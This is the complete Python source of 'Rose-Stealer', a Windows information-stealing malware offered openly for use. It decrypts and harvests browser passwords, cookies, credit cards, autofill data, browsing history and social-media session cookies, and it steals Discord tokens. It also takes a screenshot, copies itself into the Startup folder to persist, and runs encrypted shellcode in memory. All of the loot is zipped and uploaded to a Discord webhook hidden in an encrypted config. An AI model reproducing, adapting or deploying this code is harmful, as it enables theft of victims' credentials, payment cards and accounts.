# github.com/gumbobrot
# github.com/0xrose


__name__ = "Rose-Stealer"
__version__ = "1.0.2"
__author__ = "gumbobrot"


import asyncio
import base64
import ctypes
import glob
import threading
import zipfile
import re
import time
import json
import os
import configparser
import shutil
import sys
import string
import random
import sqlite3
import subprocess
import base64
import zlib
import datetime
from aiohttp import ClientSession, ClientResponse, FormData
from PIL import ImageGrab
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from win32crypt import CryptUnprotectData


class Data:
    passwords = list()
    cookies = list()
    credit_cards = list()
    auto_fill = list()
    browsing_history = list()
    download_history = list()
    bookmarks = list()
    sessions = {
        "roblox": [],
        "reddit": [],
        "twitter": [],
        "tiktok": [],
        "instagram": [],
        "twitch": [],
        "spotify": [],
        "youtube": [],
        "whatsapp": [],
    }
    tokens = list()


class Utils:
    @staticmethod
    async def get_key(path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as file:

                data = json.load(file)

                encrypted_key = data["os_crypt"]["encrypted_key"]

                encrypted_key = base64.b64decode(encrypted_key.encode("utf-8"))

                encrypted_key = encrypted_key[5:]

                decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[
                    1
                ]

                print("Decryption Key {} found in {}.".format(decrypted_key, path))

                return decrypted_key
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def decryption(nonce: bytes, ciphertext: bytes, key: bytes) -> str:
        try:
            cipher = AESGCM(key)

            decrypted_value = cipher.decrypt(nonce, ciphertext, None)

            return decrypted_value.decode("latin-1")
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    def get_random_string(length: int = 16) -> str:
        chars = string.ascii_lowercase + string.digits

        random_string = "".join(random.choice(chars) for _ in range(length))

        return random_string

    @staticmethod
    async def kill_process(proc: str) -> None:
        try:
            if Variables.debug_mode:
                return

            print("Killing Process {}.".format(proc))

            cmd = "taskkill /F /IM {}".format(proc)

            process = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)

            process.wait()
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def file_writer(path: str, data_set: list, c=True) -> None:
        try:
            if len(data_set) != 0:
                with open(path, "a", encoding="utf-8") as file:
                    if c:
                        file.write(
                            "rose-stealer v2 | github.com/0xrose\n=====================================\n"
                        )

                    for value in data_set:
                        file.write(value)
        except Exception as e:
            print("Error occured:", e)

    async def Save(self) -> None:
        if len(Data.tokens) != 0:
            await self.file_writer(
                os.path.join(Variables.discord_path, "tokens.txt"),
                Data.tokens,
                c=False,
            )

        functions = [
            [
                os.path.join(Variables.browser_path, "passwords.txt"),
                Data.passwords,
            ],
            [
                os.path.join(Variables.browser_path, "cookies.txt"),
                Data.cookies,
            ],
            [
                os.path.join(Variables.browser_path, "credit_cards.txt"),
                Data.credit_cards,
            ],
            [
                os.path.join(Variables.browser_path, "browsing_history.txt"),
                Data.browsing_history,
            ],
            [
                os.path.join(Variables.browser_path, "download_history.txt"),
                Data.download_history,
            ],
            [
                os.path.join(Variables.browser_path, "auto_fill.txt"),
                Data.auto_fill,
            ],
            [
                os.path.join(Variables.browser_path, "bookmarks.txt"),
                Data.bookmarks,
            ],
        ]

        for function in functions:
            await self.file_writer(function[0], function[1])

        if any(session for session in Data.sessions.values()) and not os.path.exists(
            Variables.session_path
        ):
            os.mkdir(Variables.session_path)

            for session_name in Data.sessions:
                session_cookies = Data.sessions[session_name]

                session_file = os.path.join(
                    Variables.session_path, "{}.txt".format(session_name)
                )

                if len(session_cookies) != 0:
                    with open(session_file, "a", encoding="utf-8") as file:
                        file.write(
                            "rose-stealer v2 | github.com/0xrose\n=====================================\n"
                        )

                    for session_cookie in session_cookies:
                        with open(session_file, "a", encoding="utf-8") as file:
                            file.write(
                                "{} Cookie : {}\n\n".format(
                                    session_name.capitalize(), session_cookie
                                )
                            )

    @staticmethod
    async def zip_file() -> None:
        try:
            with zipfile.ZipFile(
                Variables.zip_file, "w", compression=zipfile.ZIP_DEFLATED
            ) as zipf:
                for root, _, files in os.walk(Variables.path):
                    for file in files:
                        zipf.write(
                            os.path.join(root, file),
                            os.path.relpath(os.path.join(root, file), Variables.path),
                        )
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def Send() -> ClientResponse:
        embed = {
            "title": "Rose-Stealer Log",
            "description": f"```\nIP: {await System_Information().get_ip()}\nHostname: {await System_Information().get_hostname()}\nUsername: {await System_Information().get_username()}\nUUID: {await System_Information().get_uuid()}\n```",
            "color": 0xF5424B,
            "footer": {
                "text": "rose-stealer v1 · t.me/rosestealer",
            },
            "timestamp": datetime.datetime.utcnow().isoformat(),
        }

        payload = {
            "username": "Rose",
            "avatar_url": "https://i.pinimg.com/736x/f2/20/6b/f2206bc74a24dab53458559efcf971fe.jpg",
            "content": "@here",
            "embeds": [embed],
        }

        async with ClientSession() as aiohttp_session:
            data = FormData()
            data.add_field(
                "payload_json", json.dumps(payload), content_type="application/json"
            )
            data.add_field("file", open(os.path.abspath(Variables.zip_file), "rb"))
            async with aiohttp_session.post(
                base64.b85decode(
                    bytes.fromhex(Variables.config.get("main", "discord_webhook"))
                ).decode("utf-8"),
                data=data,
            ) as response:
                return response


class Modules:
    @staticmethod
    async def startup() -> None:
        try:
            startup_path = os.path.join(
                os.getenv("APPDATA"),
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )
            shutil.copy(sys.argv[0], startup_path)
        except Exception as e:
            print("Error occured:", e)

    # credits to github.com/iframepm, im just ass with the winapi
    @staticmethod
    def Shellcode_Loader() -> None:
        try:
            with open(
                os.path.join(
                    Config.base_path,
                    Variables.config.get("shellcode_loader", "shellcode_file_name"),
                ),
                "rb",
            ) as file:
                bytes = file.read()
                b32_decoded_config = base64.b32hexdecode(bytes)
                decompressed_config = zlib.decompress(b32_decoded_config)
                decrypted_shellcode = asyncio.run(
                    Utils().decryption(
                        decompressed_config[:12],
                        decompressed_config[12:],
                        bytes.fromhex(
                            Variables.config.get("shellcode_loader", "shellcode_key")
                        ),
                    )
                )

            shellcode = bytearray(decrypted_shellcode.encode("latin-1"))
            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
            ptr = ctypes.windll.kernel32.VirtualAlloc(
                ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40),
            )
            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
            ctypes.windll.kernel32.RtlMoveMemory(
                ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))
            )
            handle = ctypes.windll.kernel32.CreateThread(
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_uint64(ptr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0)),
            )
            ctypes.windll.kernel32.WaitForSingleObject(
                ctypes.c_int(handle), ctypes.c_int(-1)
            )
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def Screenshot() -> None:
        screenshot = ImageGrab.grab(all_screens=False)

        filename = os.path.join(Variables.path, "screenshot.jpg")
        screenshot.save(filename)


class System_Information:
    @staticmethod
    async def get_uuid() -> str:
        try:
            return (
                subprocess.check_output(
                    ["wmic", "csproduct", "get", "UUID"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                .decode()
                .split("\n")[1]
                .strip()
                if len(
                    subprocess.check_output(
                        ["wmic", "csproduct", "get", "UUID"],
                        creationflags=subprocess.CREATE_NO_WINDOW,
                    )
                    .decode()
                    .split("\n")
                )
                > 1
                else Utils().get_random_string()
            )
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def get_hostname() -> str:
        try:
            return os.getenv("COMPUTERNAME")
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def get_username() -> str:
        try:
            return os.getenv("USERNAME")
        except Exception as e:
            print("Error occured:", e)

    @staticmethod
    async def get_ip() -> str:
        try:
            async with ClientSession() as aiohttp_session:
                async with aiohttp_session.get("https://api.ipify.org") as response:
                    return await response.text()
        except Exception as e:
            print("Error occured:", e)


class Config:
    if getattr(sys, "frozen", False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")

    def __init__(self) -> None:
        key = "eb0abca617432754f19ad3b0f02c44ad041709bfba8fdb18c87463459394bff8"  # hexified 32 byte key (128-bit)
        config_file_name = "config.aes"  # config file path like config.aes, configuration.dat or conf.ini

        self.config = configparser.ConfigParser()

        config_file_path = os.path.join(self.base_path, config_file_name)

        with open(config_file_path, "rb") as file:
            bytes = file.read()
            b32_decoded_config = base64.b32hexdecode(bytes)
            decompressed_config = zlib.decompress(b32_decoded_config)
            decrypted_config = asyncio.run(
                Utils().decryption(
                    decompressed_config[:12],
                    decompressed_config[12:],
                    bytes.fromhex(key),
                )
            )

        self.config.read_string(decrypted_config)


class Variables:
    appdata = os.getenv("APPDATA")
    local_appdata = os.getenv("LOCALAPPDATA")

    config = Config().config

    pathh = os.path.join(appdata, Utils().get_random_string())

    if not os.path.exists(pathh):
        os.mkdir(pathh)

    zip_file = os.path.join(pathh, Utils.get_random_string() + ".zip")
    path = os.path.join(pathh, asyncio.run(System_Information().get_uuid()))
    browser_path = os.path.join(path, "Browser Credentials")
    session_path = os.path.join(browser_path, "Session Cookies")
    discord_path = os.path.join(path, "Discord Tokens")

    debug_mode = True if config.get("advanced", "debug_mode") == "True" else False

    browser_paths = {
        "Microsoft Edge": os.path.join(local_appdata, "Microsoft", "Edge"),
        "Google Chrome": os.path.join(local_appdata, "Google", "Chrome"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
    }

    browser_profiles = [
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5",
    ]

    process_list = [
        "chrome.exe",
        "msedge.exe",
        "brave.exe",
        "opera.exe",
    ]

    discord_paths = [
        os.path.join(appdata, "discord", "Local Storage", "leveldb"),
        os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(appdata, "Lightcord", "Local Storage", "leveldb"),
        os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
    ]


class Discord:
    def __init__(self) -> None:
        if not os.path.exists(Variables.discord_path):
            os.mkdir(Variables.discord_path)

    async def get_tokens(self, path: str, web=False) -> None:
        try:
            if not os.path.exists(path):
                return

            files = []
            for file_extension in ["*.ldb", "*.log"]:
                files.extend(
                    [
                        os.path.abspath(ff)
                        for ff in glob.glob(os.path.join(path, file_extension))
                    ]
                )

            if not web:
                key = await Utils().get_key(
                    path.replace("Local Storage\\leveldb", "Local State")
                )

            for file in files:
                with open(file, "r", encoding="latin-1") as file:
                    if web:
                        for local_tokens in re.findall(
                            r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", file.read()
                        ):
                            if local_tokens:
                                for token in local_tokens.split():
                                    if token:
                                        token = "MT" + token + "\n"
                                        if token not in Data.tokens:
                                            Data.tokens.append(token)

                    elif not web:
                        for local_tokens in re.findall(
                            r"dQw4w9WgXcQ:[^\"]*", file.read()
                        ):
                            if local_tokens:
                                for token in local_tokens.split("dQw4w9WgXcQ:"):
                                    if token:
                                        try:
                                            token = base64.b64decode(token)

                                            nonce = token[3:15]
                                            ciphertext = token[15:]

                                            token = (
                                                await Utils().decryption(
                                                    nonce, ciphertext, key
                                                )
                                                + "\n"
                                            )

                                            if token not in Data.tokens:
                                                Data.tokens.append(token)
                                        except Exception as e:
                                            print("Error occured:", e)
        except Exception as e:
            print("Error occured:", e)

    async def Run(self) -> None:
        tasks = []
        for path in Variables.discord_paths:
            tasks.append(self.get_tokens(path))

        for path in Variables.browser_paths.values():
            for profile in Variables.browser_profiles:
                path = os.path.join(
                    path, "User Data", profile, "Local Storage", "leveldb"
                )
                tasks.append(self.get_tokens(path, web=True))

        await asyncio.gather(*tasks)


class Browser:
    def __init__(self) -> None:
        if not os.path.exists(Variables.browser_path):
            os.mkdir(Variables.browser_path)

    async def get_data(
        self, function: callable, path: str, sqlite3_command: str, browser_name: str
    ) -> None:
        try:
            temp_path = os.path.join(os.getenv("TEMP"), Utils().get_random_string())

            shutil.copy(path, temp_path)
            con = sqlite3.connect(temp_path)
            cur = con.cursor()
            cur.execute(sqlite3_command)

            await function(browser_name, cur)

            con.close()
            os.remove(temp_path)
        except Exception as e:
            print("Error occured:", e)

    async def get_passwords(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            nonce = row[2][3:15]
            ciphertext = row[2][15:]

            decrypted_password = await Utils().decryption(nonce, ciphertext, self.key)

            Data.passwords.append(
                "Browser Name : {}\nOrigin URL : {}\nUsername Value : {}\nPassword Value : {}\n\n".format(
                    browser_name, row[0], row[1], decrypted_password
                )
            )

    async def get_cookies(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                continue

            nonce = row[3][3:15]
            ciphertext = row[3][15:]

            decrypted_cookie = await Utils().decryption(nonce, ciphertext, self.key)

            if ".roblosecurity" == row[1].lower():
                Data.sessions["roblox"].append(decrypted_cookie)
            elif row[1].lower() == "sessionid" and "tiktok" in row[0]:
                Data.sessions["tiktok"].append(decrypted_cookie)
            elif row[1].lower() == "sessionid" and "instagram" in row[0]:
                Data.sessions["instagram"].append(decrypted_cookie)
            elif row[1].lower() == "reddit_session" and "reddit" in row[0]:
                Data.sessions["reddit"].append(decrypted_cookie)
            elif row[1].lower() == "auth_token" and "twitter" in row[0]:
                Data.sessions["twitter"].append(decrypted_cookie)

            Data.cookies.append(
                "Browser Name : {}\nHost Key : {}\nName : {}\nPath : {}\nDecrypted Value : {}\nExpires UTC : {}\n\n".format(
                    browser_name, row[0], row[1], row[2], decrypted_cookie, row[4]
                )
            )

    async def get_credit_cards(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                continue

            nonce = row[3][3:15]
            ciphertext = row[3][15:]

            decrypted_credit_card = await Utils().decryption(
                nonce, ciphertext, self.key
            )

            Data.credit_cards.append(
                "Browser Name : {}\nName On Card : {}\nExpiration Date : {}\nCredit Card Number : {}\nDate Modified : {}\n\n".format(
                    browser_name,
                    row[0],
                    "{}/{}".format(row[2], row[1]),
                    decrypted_credit_card,
                    row[4],
                )
            )

    async def get_browsing_history(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            Data.browsing_history.append(
                "Browser Name : {}\nURL : {}\nTitle : {}\nLast Visit Time : {}\n\n".format(
                    browser_name,
                    row[0],
                    row[1],
                    row[2],
                )
            )

    async def get_download_history(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1]:
                continue

            Data.download_history.append(
                "Browser Name : {}\nTab URL : {}\nTarget Path : {}\n\n".format(
                    browser_name,
                    row[0],
                    row[1],
                )
            )

    async def get_auto_fill(self, browser_name: str, cur: list) -> None:
        for row in cur.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            Data.auto_fill.append(
                "Browser Name : {}\nName : {}\nValue : {}\nDate Last Used : {}\n\n".format(
                    browser_name,
                    row[0],
                    row[1],
                    row[2],
                )
            )

    async def get_browser(self, browser_name: str, browser_path: str) -> None:
        print("Reached Browser {} with Path {}.".format(browser_name, browser_path))

        path = os.path.join(browser_path, "Local State")
        self.key = await Utils().get_key(path)

        for browser_profile in Variables.browser_profiles:
            path = os.path.join(browser_path, browser_profile)

            if os.path.exists(path):
                funcs = [
                    [
                        self.get_passwords,
                        os.path.join(path, "Login Data"),
                        "SELECT origin_url, username_value, password_value FROM logins",
                    ],
                    [
                        self.get_cookies,
                        os.path.join(path, "Network", "Cookies"),
                        "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
                    ],
                    [
                        self.get_credit_cards,
                        os.path.join(path, "Web Data"),
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards",
                    ],
                    [
                        self.get_browsing_history,
                        os.path.join(path, "History"),
                        "SELECT url, title, last_visit_time FROM urls",
                    ],
                    [
                        self.get_download_history,
                        os.path.join(path, "History"),
                        "SELECT tab_url, target_path FROM downloads",
                    ],
                    [
                        self.get_auto_fill,
                        os.path.join(path, "Web Data"),
                        "SELECT name, value, date_last_used FROM autofill",
                    ],
                ]

                for func in funcs:
                    await self.get_data(func[0], func[1], func[2], browser_name)

    async def Run(self) -> None:
        _process_tasks = [Utils().kill_process(proc) for proc in Variables.process_list]

        await asyncio.gather(*_process_tasks)

        tasks = []

        for browser_name in Variables.browser_paths:
            browser_path = Variables.browser_paths[browser_name]

            browser_path = os.path.join(browser_path, "User Data")
            if os.path.exists(os.path.join(browser_path)):
                tasks.append(self.get_browser(browser_name, browser_path))

        await asyncio.gather(*tasks)


class Rose:
    def __init__(self) -> None:
        if not os.path.exists(Variables.path):
            os.mkdir(Variables.path)

        asyncio.run(self.Execute())

    @staticmethod
    async def Execute() -> None:
        print("Storage Directory is {}.".format(Variables.path))

        tasks = []

        if Variables.config.get("modules", "browser") == "True":
            tasks.append(Browser().Run())

        if Variables.config.get("modules", "discord") == "True":
            tasks.append(Discord().Run())

        if Variables.config.get("modules", "shellcode_loader") == "True":
            # tasks.append(Modules().Shellcode_Loader())
            threading.Thread(target=Modules().Shellcode_Loader).start()

        if Variables.config.get("modules", "screenshot") == "True":
            tasks.append(Modules().Screenshot())

        if Variables.config.get("modules", "startup") == "True":
            tasks.append(Modules().startup())

        await asyncio.gather(*tasks)

        await asyncio.gather(Utils().Save())

        if any(files for _, _, files in os.walk(Variables.path)):
            await Utils().zip_file()

            async with ClientSession() as aiohttp_session:
                await asyncio.gather(Utils().Send())

        if not Variables.debug_mode and os.path.exists(Variables.path):
            shutil.rmtree(Variables.pathh)


if (
    __name__ == base64.b64decode(b"Um9zZS1TdGVhbGVy").decode()
    and __author__ == base64.b64decode(b"Z3VtYm9icm90").decode()
):
    if os.name == "nt":
        print("\x1b[1;41mRose baby on top fr\x1b[0m")
        start_time = time.time()
        Rose()
        print("Code executed within {} seconds.".format(time.time() - start_time))
    else:
        print("Error occured: Only Windows OS is supported.")
        sys.exit(1)
